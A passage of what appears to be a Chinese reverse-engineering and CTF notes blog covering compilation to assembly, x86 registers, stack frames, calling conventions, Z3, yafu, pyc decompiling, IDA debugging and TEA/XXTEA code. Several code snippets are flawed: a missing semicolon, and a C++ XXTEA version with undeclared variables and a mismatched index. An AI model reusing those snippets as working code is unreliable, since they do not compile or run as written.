1)));</span><br><span class="line">extern void flockfile (FILE *__stream) __attribute__ ((__nothrow__ , __leaf__));</span><br><span class="line">extern int ftrylockfile (FILE *__stream) __attribute__ ((__nothrow__ , __leaf__)) ;</span><br><span class="line">extern void funlockfile (FILE *__stream) __attribute__ ((__nothrow__ , __leaf__));</span><br><span class="line">extern int __uflow (FILE *);</span><br><span class="line">extern int __overflow (FILE *, int);</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;hello&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h4><ul><li>将高级语言转变为汇编，可进行代码优化，例如氧气</li><li>gcc -S-masm&#x3D;intel main.c，以intel语法编译为汇编</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">        .file   &quot;main.c&quot;</span><br><span class="line">        .intel_syntax noprefix</span><br><span class="line">        .text</span><br><span class="line">        .section        .rodata</span><br><span class="line">.LC0:</span><br><span class="line">        .string &quot;hello&quot;</span><br><span class="line">        .text</span><br><span class="line">        .globl  main</span><br><span class="line">        .type   main, @function</span><br><span class="line">main:</span><br><span class="line">.LFB0:</span><br><span class="line">        .cfi_startproc</span><br><span class="line">        push    rbp</span><br><span class="line">        .cfi_def_cfa_offset 16</span><br><span class="line">        .cfi_offset 6, -16</span><br><span class="line">        mov     rbp, rsp</span><br><span class="line">        .cfi_def_cfa_register 6</span><br><span class="line">        lea     rax, .LC0[rip]</span><br><span class="line">        mov     rdi, rax</span><br><span class="line">        mov     eax, 0</span><br><span class="line">        call    printf@PLT</span><br><span class="line">        mov     eax, 0</span><br><span class="line">        pop     rbp</span><br><span class="line">        .cfi_def_cfa 7, 8</span><br><span class="line">        ret</span><br><span class="line">        .cfi_endproc</span><br><span class="line">.LFE0:</span><br><span class="line">        .size   main, .-main</span><br><span class="line">        .ident  &quot;GCC: (Debian 11.3.0-5) 11.3.0&quot;</span><br><span class="line">        .section        .note.GNU-stack,&quot;&quot;,@progbits</span><br></pre></td></tr></table></figure><h4 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h4><ul><li>生成可重定向(<code>relocatable</code>)的机器代码文件</li><li>gcc -c main.c</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file main.o</span><br><span class="line">main.o: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), not stripped</span><br></pre></td></tr></table></figure><h4 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h4><ul><li>将所有需要的文件链接到一个可执行文件中</li><li>gcc main.c</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file a.out</span><br><span class="line">a.out: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=814605956fa139a9fa174f09ff3535861859bd21, for GNU/Linux 3.2.0, not stripped</span><br></pre></td></tr></table></figure><h2 id="常见寄存器（Intel）"><a href="#常见寄存器（Intel）" class="headerlink" title="常见寄存器（Intel）"></a>常见寄存器（Intel）</h2><ul><li>通用寄存器<ul><li>EAX：（针对操作数和结果数据的）累加器</li><li>EBX：（DS段的数据指针）基址寄存器</li><li>ECX：（字符串和循环操作的）计数器</li><li>EDX：（I&#x2F;O指针）数据寄存器</li><li>ESI：（字符串操作源指针）源变址寄存器</li><li>EDI：（字符串操作目标指针）目的变址寄存器</li><li>EBP：（SS段中栈内数据指针）扩展基址指针寄存器[栈帧寄存器、栈底指针寄存器]</li><li>ESP：（SS段中栈指针）栈指针寄存器[指向栈顶]</li></ul></li><li>段寄存器<ul><li>CS：代码段寄存器</li><li>SS：栈段寄存器</li><li>DS：数据段寄存器</li><li>FS：数据段寄存器</li><li>ES：附加数据寄存器</li><li>GS：数据段寄存器</li></ul></li><li>程序状态与控制寄存器<ul><li>EFLAGS：标志寄存器，32个位元的01控制<ul><li>ZF(零标志器，运算结果为0时置1)</li><li>CF(进位标志，运算结果向最高位以上进位时置1)</li><li>OF(溢出标志)</li><li>AF(辅助进位标志，运算结果在第3位的时候置1)</li><li>SF(符号标志，有符号整型的符号位为1时置1)</li></ul></li></ul></li><li>指令指针寄存器<ul><li>EIP：保存CPU要执行的指令地址</li></ul></li></ul><h2 id="栈帧"><a href="#栈帧" class="headerlink" title="栈帧"></a>栈帧</h2><ul><li><p>栈特点：FILO（first in last out）</p></li><li><p>在调用函数的时候需要将参数压入栈中，栈顶地址发生改变，而使用结束又需要将参数弹出，将栈恢复到被调用前的状态，为了便于管理，于是出现了栈帧。</p><ul><li><p>官方解释：利用EBP寄存器访问栈内局部变量、参数、函数返回地址的手段。</p></li><li><p>具体操作：在调用函数之前，将ESP中的栈顶地址存入EBP中，将该地址作为基准点。然后调用函数，ESP寄存器正常进行，其间可通过EBP去控制访问变量参数等等，在调用结束后，再将EBP中的基准点地址给到ESP，将栈的状态恢复到函数调用前</p></li><li><p>代码流程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PUSH EBP          ;函数开始</span><br><span class="line">MOV  EBP,ESP      ;将栈顶地址存入EBP中</span><br><span class="line"></span><br><span class="line">....              ;函数执行，期间EBP地址不变</span><br><span class="line"></span><br><span class="line">MOV  ESP,EBP      ;基准点地址给到ESP</span><br><span class="line">POP EBP           ;栈状态恢复，弹出EBP</span><br><span class="line">RETN              ;函数结束</span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="函数调用约定"><a href="#函数调用约定" class="headerlink" title="函数调用约定"></a>函数调用约定</h2><p>(Calling Convention)</p><ul><li><p>三种方式(cdcel, stdcall, fastcall)</p><ul><li><p>cdcel<br>主要运用于c语言，由调用者负责清理栈</p><blockquote><p>函数调用结束后通过移动ESP，恢复到调用前的栈状态</p></blockquote></li><li><p>stdcall<br>主要运用于Win32 API，由被调用者清理栈</p><blockquote><p>在被调用函数的结尾通过RETN语句移动ESP到原位置</p></blockquote></li><li><p>fastcall</p><blockquote><p>使用寄存器去传递函数的部分参数，实现快速调用</p></blockquote></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Z3 &amp; Yafu</title>
      <link href="/2023/03/31/Z3&amp;yafu/"/>
      <url>/2023/03/31/Z3&amp;yafu/</url>
      
        <content type="html"><![CDATA[<ul><li>Z3 &amp; Yafu<span id="more"></span></li></ul><HR color="red"></HR><h2 id="Z3"><a href="#Z3" class="headerlink" title="Z3"></a>Z3</h2><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><blockquote><p>直接搞到网盘上用链接吧：<br>链接：(<a href="https://pan.baidu.com/s/1gni_eYUC-Y_dQVogJh9QyA?pwd=1234">https://pan.baidu.com/s/1gni_eYUC-Y_dQVogJh9QyA?pwd=1234</a>)<br>提取码：1234</p></blockquote><ol><li>下载解压</li><li>将文件中bin目录配置到系统变量path中</li><li>新建PYTHONPATH系统变量，路径为bin&#x2F;python目录</li></ol><h3 id="Use"><a href="#Use" class="headerlink" title="Use"></a>Use</h3><ol><li>open cmd</li></ol><blockquote><p>Open the bin&#x2F;Python directory in cmd</p></blockquote><p>or</p><blockquote><p>在bin&#x2F;python目录下shift右键powershell</p></blockquote><ol><li>run python</li><li>import code</li></ol><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><ul><li><p>example for authority</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line">x = Real(&#x27;x&#x27;)</span><br><span class="line">y = Real(&#x27;y&#x27;)</span><br><span class="line">s = Solver()</span><br><span class="line">s.add(x + y &gt; 5, x &gt; 1, y &gt; 1)</span><br><span class="line">print(s.check())</span><br><span class="line">print(s.model())</span><br></pre></td></tr></table></figure></li><li><p>简单说一下</p></li></ul><ol><li>导包z3</li><li>a &#x3D; Real(b), a为方程中的未知数，b为输出时候用来表示a的变量</li><li>Solver()，简言之：解决函数，方程接收器</li><li>add()，括号里塞方程就行，用“,”隔开，或者你多用几个add()也行</li><li>后面俩不用动了，就那样</li><li>回车出结果</li></ol><h2 id="yafu"><a href="#yafu" class="headerlink" title="yafu"></a>yafu</h2><h3 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h3><ul><li>Yafu is a tool that can be used for prime factor decomposition</li></ul><h3 id="Download"><a href="#Download" class="headerlink" title="Download"></a>Download</h3><ul><li><a href="https://sourceforge.net/projects/yafu/">https://sourceforge.net/projects/yafu/</a></li></ul><h3 id="Use-1"><a href="#Use-1" class="headerlink" title="Use"></a>Use</h3><ul><li>Execute yafu-x64.exe in the file in cmd</li></ul><h3 id="Function"><a href="#Function" class="headerlink" title="Function"></a>Function</h3><ul><li>factor(num)</li></ul>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pyc decomplier</title>
      <link href="/2023/03/31/Pyc/"/>
      <url>/2023/03/31/Pyc/</url>
      
        <content type="html"><![CDATA[<ul><li>pyc<span id="more"></span></li></ul><HR color="red"></HR><h2 id="2022-x2F-10-x2F-25-重写"><a href="#2022-x2F-10-x2F-25-重写" class="headerlink" title="2022&#x2F;10&#x2F;25 重写"></a>2022&#x2F;10&#x2F;25 重写</h2><ul><li><p>加一个内容：exe到pyc的转化</p><ul><li>可操作exe的识别（用python编译生成的exe文件一般来讲会比较大）</li><li>具体处理（利用脚本完成）</li></ul></li><li><p>py脚本（pyinstxtractor）</p><p>（<a href="https://gitcode.net/mirrors/extremecoders-re/pyinstxtractor?utm_source=csdn_github_accelerator">mirrors &#x2F; extremecoders-re &#x2F; pyinstxtractor · GitCode</a>）</p></li><li><p>使用</p><ul><li><p>建议官方文档readme.md</p></li><li><p>比较常见的操作就是将要转化的exe程序复制到脚本文件目录下，执行命令</p><blockquote><p>python pyinstxtractor.py test.exe</p></blockquote></li></ul></li></ul><h3 id="pyc文件反编"><a href="#pyc文件反编" class="headerlink" title="pyc文件反编"></a>pyc文件反编</h3><p>py生成的中间文件</p><blockquote><p>先省略无数字，需要深入了解底层再说</p></blockquote><h3 id="处理"><a href="#处理" class="headerlink" title="处理"></a>处理</h3><ul><li><p>借用外部资源，安装uncompyle6</p><blockquote><p>pip install uncompyle</p></blockquote></li><li><p>使用</p><blockquote><p>uncompyle6 name.pyc &gt; name.py</p></blockquote></li><li><p>或者直接用网上的在线反编译：<br>(<a href="https://tool.lu/pyc/">https://tool.lu/pyc/</a>)</p></li></ul><blockquote><p>因为比较bug的一件事情是：<br>我遇到了某pyc文件用uncompyle6无法反编的情况，目前推测应该是版本不对的问题<br>后续再研究研究</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDA</title>
      <link href="/2023/03/31/IDA/"/>
      <url>/2023/03/31/IDA/</url>
      
        <content type="html"><![CDATA[<ul><li>IDA<span id="more"></span></li></ul><HR color="red"></HR><h2 id="快捷操作"><a href="#快捷操作" class="headerlink" title="快捷操作"></a>快捷操作</h2><table><thead><tr><th>操作</th><th>作用</th></tr></thead><tbody><tr><td>F5</td><td>反汇编</td></tr><tr><td>函数列表Ctrl+F</td><td>搜索函数</td></tr><tr><td>X</td><td>交叉引用</td></tr><tr><td>G</td><td>跳转到指定地址</td></tr><tr><td>Shift+F12</td><td>字符串列表</td></tr><tr><td>Alt+T</td><td>按指令查找</td></tr><tr><td>N</td><td>重命名(函数名等)</td></tr><tr><td>Ctrl+Z</td><td>操作撤销</td></tr><tr><td>D</td><td>将字符串等元素转为数据</td></tr><tr><td>A</td><td>将数据转变为字符串</td></tr><tr><td>C</td><td>将数据转变为汇编代码</td></tr><tr><td>U</td><td>将字符串转变为原始数据</td></tr><tr><td>Shift+E</td><td>导出数据</td></tr><tr><td>Shift+F2</td><td>脚本嵌入</td></tr><tr><td>;</td><td>添加注释(所有交叉参考处均显示)</td></tr><tr><td>:</td><td>添加注释(仅在此处显示)</td></tr><tr><td>Esc</td><td>后退一步</td></tr><tr><td>Ctrl+Enter</td><td>前进一步</td></tr><tr><td>Alt+M</td><td>标记当前位置</td></tr><tr><td>Ctrl+M</td><td>跳转到标记位置</td></tr><tr><td>P</td><td>创建函数</td></tr></tbody></table><h2 id="设置断点触发脚本"><a href="#设置断点触发脚本" class="headerlink" title="设置断点触发脚本"></a>设置断点触发脚本</h2><p><img src="https://s2.loli.net/2023/05/07/r4ADSgV59JZK6ad.png" alt="微信截图_20230507164403.png"></p><h2 id="elf调试"><a href="#elf调试" class="headerlink" title="elf调试"></a>elf调试</h2><ul><li>将linux_server&#x2F;64复制到kali运行</li><li>ida设置调试</li></ul><h2 id="so调试"><a href="#so调试" class="headerlink" title="so调试"></a>so调试</h2><ul><li>将android_server复制到安卓环境中（模拟器 or 测试机）</li><li>chmod 777 android_server并运行</li><li>adb forward将调试端口转移到本机</li><li>将so文件所在apk以debug模式启动</li><li>IDA打开要调试的文件，附加apk进程</li></ul>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tool </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tea</title>
      <link href="/2023/03/31/Tea/"/>
      <url>/2023/03/31/Tea/</url>
      
        <content type="html"><![CDATA[<ul><li>一写题就是变种xxtea，我已经无语了</li><li>茶类算法一般来讲顺序逆写加密代码即可</li><li>代码基于网络开源代码修改，侵删<span id="more"></span></li></ul><HR color="red"></HR><h2 id="Tea"><a href="#Tea" class="headerlink" title="Tea"></a>Tea</h2><h4 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h4><ul><li>delta常数：0x9e3779b9</li><li>key：4个32位无符号整数</li><li>v：2个32位无符号整数</li></ul><h4 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h4><ul><li>利用key和delta对数据进行32轮简单和加密</li><li>特征：<ul><li>三异或</li><li>4、5移位</li></ul></li></ul><h4 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">encrypt</span> <span class="params">(<span class="type">uint32_t</span>* v, <span class="type">uint32_t</span>* k)</span> </span>&#123;  </span><br><span class="line">    <span class="type">uint32_t</span> delta=<span class="number">0x9e3779b9</span>;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], sum = <span class="number">0</span>;               </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;                      </span><br><span class="line">        sum += delta;  </span><br><span class="line">        v0 += ((v1&lt;&lt;<span class="number">4</span>) + k[<span class="number">0</span>]) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k[<span class="number">1</span>]);  </span><br><span class="line">        v1 += ((v0&lt;&lt;<span class="number">4</span>) + k[<span class="number">2</span>]) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k[<span class="number">3</span>]);  </span><br><span class="line">    &#125;                                                </span><br><span class="line">    v[<span class="number">0</span>] = v0; </span><br><span class="line">    v[<span class="number">1</span>] = v1;  </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h4 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">decrypt</span> <span class="params">(<span class="type">uint32_t</span>* v, <span class="type">uint32_t</span>* k)</span> </span>&#123;  </span><br><span class="line">    <span class="type">uint32_t</span> delta = <span class="number">0x9e3779b9</span>; </span><br><span class="line"><span class="type">uint32_t</span> sum = <span class="number">0xc6ef3720</span>     <span class="comment">//sum = delta*32 = 0x13c6ef3720，取32位，高位数据溢出 </span></span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>]; </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;                         </span><br><span class="line">        v1 -= ((v0&lt;&lt;<span class="number">4</span>) + k[<span class="number">2</span>]) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k[<span class="number">3</span>]);  </span><br><span class="line">        v0 -= ((v1&lt;&lt;<span class="number">4</span>) + k[<span class="number">0</span>]) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k[<span class="number">1</span>]);  </span><br><span class="line">        sum -= delta;  </span><br><span class="line">    &#125;                                            </span><br><span class="line">    v[<span class="number">0</span>] = v0; </span><br><span class="line">    v[<span class="number">1</span>] = v1;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><h2 id="xxTea"><a href="#xxTea" class="headerlink" title="xxTea"></a>xxTea</h2><ul><li>key和delta如上，加密轮数由数据长度n决定</li><li>改魔数的就另当别论，一般解tea都是用c++写</li></ul><h4 id="c"><a href="#c" class="headerlink" title="c++"></a>c++</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">//常见变化点</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX (((z&gt;&gt;5^y<span class="string">&lt;&lt;2) + (y&gt;</span>&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))  </span></span><br><span class="line"><span class="comment">//key定义，4个32位无符号整数</span></span><br><span class="line"><span class="type">const</span> <span class="type">uint32_t</span> key[<span class="number">4</span>] = &#123;&#125;;</span><br><span class="line"><span class="comment">//delta</span></span><br><span class="line"><span class="type">uint32_t</span> delta = <span class="number">0x9E3779B9</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">encrypt</span><span class="params">(<span class="type">uint32_t</span>* flag, <span class="type">int</span> n)</span></span>&#123;</span><br><span class="line">  <span class="type">uint32_t</span> y, z, sum;  </span><br><span class="line">  rounds = <span class="number">52</span> / n + <span class="number">6</span>;</span><br><span class="line">  sum = <span class="number">0</span>;</span><br><span class="line">  z = flag[n - <span class="number">1</span>];</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    sum += delta;</span><br><span class="line">    e = (sum&gt;&gt;<span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; n - <span class="number">1</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      y = flag[i+<span class="number">1</span>];</span><br><span class="line">      z = flag[i] += MX;</span><br><span class="line">    &#125;</span><br><span class="line">    y = flag[<span class="number">0</span>];</span><br><span class="line">    z = flag[n<span class="number">-1</span>] += MX;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> (--rounds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">decrypt</span><span class="params">(<span class="type">uint32_t</span>* flag, <span class="type">int</span> n)</span></span>&#123;</span><br><span class="line">  <span class="type">uint32_t</span> y, z, sum;  </span><br><span class="line">  rounds = <span class="number">52</span> / n + <span class="number">6</span>;</span><br><span class="line">  sum = rounds*delta;</span><br><span class="line">  y = flag[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    e = (sum&gt;&gt;<span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = n<span class="number">-1</span>; i &gt; <span class="number">0</span>; i--)</span><br><span class="line">    &#123;</span><br><span class="line">      z = flag[i<span class="number">-1</span>];</span><br><span class="line">      y = flag[i] -= MX;</span><br><span class="line">    &#125;</span><br><span class="line">    z = flag[n<span class="number">-1</span>];</span><br><span class="line">    y = flag[<span class="number">0</span>] -= MX;</span><br><span class="line">    sum -= delta;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> (--rounds);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="python"><a href="#python" class="headerlink" title="python"></a>python</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">参数描述:</span></span><br><span class="line"><span class="string">  DELTA: 神秘常数δ，它来源于黄金比率，以保证每一轮加密都不相同。但δ的精确值似乎并不重要，这里 TEA 把它定义为 δ=「(√5 - 1)231」</span></span><br><span class="line"><span class="string">      v: 需要加解密的数据，格式为32位的无符号整数组成的数组</span></span><br><span class="line"><span class="string">      n: n表示需要加密的32位无符号整数的个数（例：n为1时，只有v数组中的第一个元素被加密了），n不能大于v的长度</span></span><br><span class="line"><span class="string">      k: 密钥，格式为4个32位无符号整数组成的数组，即密钥长度为128位</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> c_uint32</span><br><span class="line"> </span><br><span class="line">DELTA = <span class="number">0x9E3779B9</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">v, n, k</span>):</span><br><span class="line">    rounds = <span class="number">6</span> + <span class="built_in">int</span>(<span class="number">52</span> / n)</span><br><span class="line">    <span class="built_in">sum</span> = c_uint32(<span class="number">0</span>)</span><br><span class="line">    z = v[n - <span class="number">1</span>].value</span><br><span class="line">    <span class="keyword">while</span> rounds &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">sum</span>.value += DELTA</span><br><span class="line">        e = (<span class="built_in">sum</span>.value &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span></span><br><span class="line">        p = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> p &lt; n - <span class="number">1</span>:</span><br><span class="line">            y = v[p + <span class="number">1</span>].value</span><br><span class="line">            v[p].value += (((z &gt;&gt; <span class="number">5</span> ^ y &lt;&lt; <span class="number">2</span>) + (y &gt;&gt; <span class="number">3</span> ^ z &lt;&lt; <span class="number">4</span>)) ^ ((<span class="built_in">sum</span>.value ^ y) + (k[(p &amp; <span class="number">3</span>) ^ e] ^ z)))</span><br><span class="line">            z = v[p].value</span><br><span class="line">            p += <span class="number">1</span></span><br><span class="line">        y = v[<span class="number">0</span>].value</span><br><span class="line">        v[n - <span class="number">1</span>].value += (((z &gt;&gt; <span class="number">5</span> ^ y &lt;&lt; <span class="number">2</span>) + (y &gt;&gt; <span class="number">3</span> ^ z &lt;&lt; <span class="number">4</span>)) ^ ((<span class="built_in">sum</span>.value ^ y) + (k[(p &amp; <span class="number">3</span>) ^ e] ^ z)))</span><br><span class="line">        z = v[n - <span class="number">1</span>].value</span><br><span class="line">        rounds -= <span class="number">1</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">v, n, k</span>):</span><br><span class="line">    rounds = <span class="number">6</span> + <span class="built_in">int</span>(<span class="number">52</span> / n)</span><br><span class="line">    <span class="built_in">sum</span> = c_uint32(rounds * DELTA)</span><br><span class="line">    y = v[<span class="number">0</span>].value</span><br><span class="line">    <span class="keyword">while</span> rounds &gt; <span class="number">0</span>:</span><br><span class="line">        e = (<span class="built_in">sum</span>.value &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span></span><br><span class="line">        p = n - <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> p &gt; <span class="number">0</span>:</span><br><span class="line">            z = v[p - <span class="number">1</span>].value</span><br><span class="line">            v[p].value -= (((z &gt;&gt; <span class="number">5</span> ^ y &lt;&lt; <span class="number">2</span>) + (y &gt;&gt; <span class="number">3</span> ^ z &lt;&lt; <span class="number">4</span>)) ^ ((<span class="built_in">sum</span>.value ^ y) + (k[(p &amp; <span class="number">3</span>) ^ e] ^ z)))</span><br><span class="line">            y = v[p].value</span><br><span class="line">            p -= <span class="number">1</span></span><br><span class="line">        z = v[n - <span class="number">1</span>].value</span><br><span class="line">        v[<span class="number">0</span>].value -= (((z &gt;&gt; <span class="number">5</span> ^ y &lt;&lt; <span class="number">2</span>) + (y &gt;&gt; <span class="number">3</span> ^ z &lt;&lt; <span class="number">4</span>)) ^ ((<span class="built_in">sum</span>.value ^ y) + (k[(p &amp; <span class="number">3</span>) ^ e] ^ z)))</span><br><span class="line">        y = v[<span class="number">0</span>].value</span><br><span class="line">        <span class="built_in">sum</span>.value -= DELTA</span><br><span class="line">        rounds -= <span class="number">1</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test1</span>():</span><br><span class="line">    k = [<span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line">    v = [c_uint32(<span class="number">1</span>), c_uint32(<span class="number">2</span>)]</span><br><span class="line">    <span class="built_in">print</span>(<span 